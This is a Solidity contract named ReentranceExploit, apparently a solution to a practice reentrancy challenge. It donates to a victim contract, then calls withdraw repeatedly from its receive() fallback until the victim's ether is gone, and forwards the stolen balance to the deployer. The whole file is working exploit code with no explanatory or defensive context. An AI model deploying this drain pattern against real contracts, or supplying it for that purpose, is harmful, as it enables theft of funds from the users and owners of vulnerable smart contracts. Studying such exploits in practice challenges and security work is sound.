// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "../interfaces/IReentrance.sol";

contract ReentranceExploit {
    address payable owner;
    IReentrance victimContract;

    constructor(IReentrance _victimContract) {
        victimContract = _victimContract;
        owner = payable(msg.sender);
    }

    function exploit() external payable {
        victimContract.donate{value: msg.value}(address(this));
        victimContract.withdraw(victimContract.balanceOf(address(this)));
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        uint256 amountToWithdraw = victimContract.balanceOf(address(this));
        if (amountToWithdraw > address(victimContract).balance) {
            amountToWithdraw = address(victimContract).balance;
        }

        if (amountToWithdraw > 0) {
            victimContract.withdraw(amountToWithdraw);
        }
    }
}
